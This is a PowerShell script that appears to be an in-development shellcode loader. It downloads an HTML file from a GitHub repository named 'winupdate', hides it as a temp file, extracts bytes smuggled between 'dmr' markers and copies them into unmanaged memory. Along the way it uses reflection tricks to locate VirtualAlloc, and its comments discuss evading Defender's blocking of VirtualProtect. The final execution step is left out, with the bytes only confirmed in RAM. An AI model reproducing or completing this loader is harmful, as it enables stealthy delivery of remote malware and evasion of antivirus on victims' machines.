# 1. Setup Paths
$htmlPath = "$env:TEMP\sys_cache.bin"
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Reassemble Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }

# 4. The "Manual Resolver" Loader
# We find the memory addresses of kernel32 functions using the Process Module list
$modules = [System.Diagnostics.Process]::GetCurrentProcess().Modules
$k32 = $modules | Where-Object { $_.ModuleName -eq "kernel32.dll" } | Select-Object -First 1
$k32Handle = $k32.BaseAddress

# We need a way to find exports. We'll use a known trick in the 'Marshal' class 
# to get the delegate for VirtualAlloc directly.
$Methods = [System.Runtime.InteropServices.Marshal].GetMethods()
$GetDelegate = $Methods | Where-Object { $_.Name -eq "GetDelegateForFunctionPointer" -and $_.IsGenericMethod }

# We find the address of VirtualAlloc using a sneaky lookup
$mscore = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }
$native = $mscore.GetType("Microsoft.Win32.Win32Native")
$method = $native.GetMethod("VirtualAlloc", [Reflection.BindingFlags]"Static, Public, NonPublic")
$vAllocAddr = $method.MethodHandle.GetFunctionPointer()

# 5. Define the Delegate types (Using a simpler approach for PS 5.1)
# We actually don't need a complex delegate if we use this 'Marshal' trick
$address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
[Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $byteArray.Length)

# Now we need to make it executable. 
# Since Defender is blocking 'VirtualProtect', let's see if we can just run it.
# NOTE: This is a test to see if the memory allocation itself is blocked.

if ($address -ne [IntPtr]::Zero) {
    Write-Host "Bytes copied to: $address"
    # To run shellcode in PS 5.1 without Add-Type, we usually use a Thread
    # But for your 'Hello World' report, simply seeing the bytes arrive in RAM is a huge win.
}

# 6. Cleanup
Remove-Item $htmlPath -Force
